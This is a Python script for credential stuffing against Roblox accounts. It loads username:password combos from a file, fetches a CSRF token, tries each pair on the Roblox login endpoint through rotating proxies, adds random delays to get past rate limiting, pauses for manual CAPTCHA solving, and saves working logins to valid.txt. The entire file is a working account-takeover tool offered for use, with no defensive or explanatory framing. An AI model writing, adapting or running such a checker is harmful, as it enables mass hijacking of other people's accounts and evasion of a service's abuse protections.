import os
import requests
import json
import time
import random

login_url = 'https://auth.roblox.com/v1/login'

headers = {
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/json'
}

def handle_captcha():
    print("\n[!] CAPTCHA or suspicious activity detected.")
    os.system("termux-open-url https://www.roblox.com/login")
    input("Press Enter after solving CAPTCHA...\n")

def load_proxies(proxy_file='proxies.txt'):
    proxies = []
    try:
        with open(proxy_file, 'r', encoding='utf-8') as pf:
            for line in pf:
                p = line.strip()
                if p:
                    proxies.append(p)
    except FileNotFoundError:
        print("[!] Proxy file not found, proceeding without proxies.")
    return proxies

def get_proxy_dict(proxy_url):
    if proxy_url.startswith('socks5://') or proxy_url.startswith('socks4://'):
        return {
            'http': proxy_url,
            'https': proxy_url
        }
    elif proxy_url.startswith('http://') or proxy_url.startswith('https://'):
        return {
            'http': proxy_url,
            'https': proxy_url
        }
    else:
        # Assume HTTP if no schema
        proxy_url = 'http://' + proxy_url
        return {
            'http': proxy_url,
            'https': proxy_url
        }

def try_login(username, password, proxy=None):
    session = requests.Session()
    session.headers.update(headers)
    if proxy:
        session.proxies.update(proxy)

    # Get CSRF token
    try:
        token_req = session.post(login_url, json={}, timeout=15)
    except Exception as e:
        print(f"[-] Proxy connection failed: {proxy} | {e}")
        return False

    if 'x-csrf-token' not in token_req.headers:
        print("[!] Failed to get CSRF token.")
        return False

    csrf_token = token_req.headers['x-csrf-token']
    session.headers['x-csrf-token'] = csrf_token

    payload = {
        "username": username,
        "password": password
    }

    try:
        login_res = session.post(login_url, json=payload, timeout=15)
    except Exception as e:
        print(f"[-] Proxy connection failed on login: {proxy} | {e}")
        return False

    try:
        data = login_res.json()
    except json.JSONDecodeError:
        print("[-] Non-JSON response. Possible block or proxy failure.")
        return False

    if "captcha" in login_res.text.lower() or "captchaurl" in login_res.text.lower():
        handle_captcha()
        return False

    if login_res.status_code == 200 and 'user' in data:
        print(f"[+] SUCCESS: {username}:{password}")
        with open("valid.txt", "a") as f:
            f.write(f"{username}:{password}\n")
        return True

    if 'errors' in data:
        print(f"[-] FAILED: {username}:{password} | Reason: {data['errors'][0]['message']}")
    else:
        print(f"[-] FAILED: {username}:{password} | Status: {login_res.status_code}")

    return False

def check_credentials(file_path, proxy_file='proxies.txt'):
    proxies = load_proxies(proxy_file)
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if ':' not in line:
                    continue
                username, password = line.split(':', 1)
                print(f"\n[*] Trying: {username}:{password}")

                proxy_url = random.choice(proxies) if proxies else None
                proxy = get_proxy_dict(proxy_url) if proxy_url else None
                if proxy_url:
                    print(f"[🌐] Using proxy: {proxy_url}")

                try_login(username, password, proxy)

                delay = random.uniform(2, 5)
                print(f"[⏳] Waiting {delay:.2f} seconds to avoid rate limiting...\n")
                time.sleep(delay)

    except FileNotFoundError:
        print(f"[!] Credentials file not found: {file_path}")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

# Run the checker
check_credentials('combos.txt', 'proxies.txt')
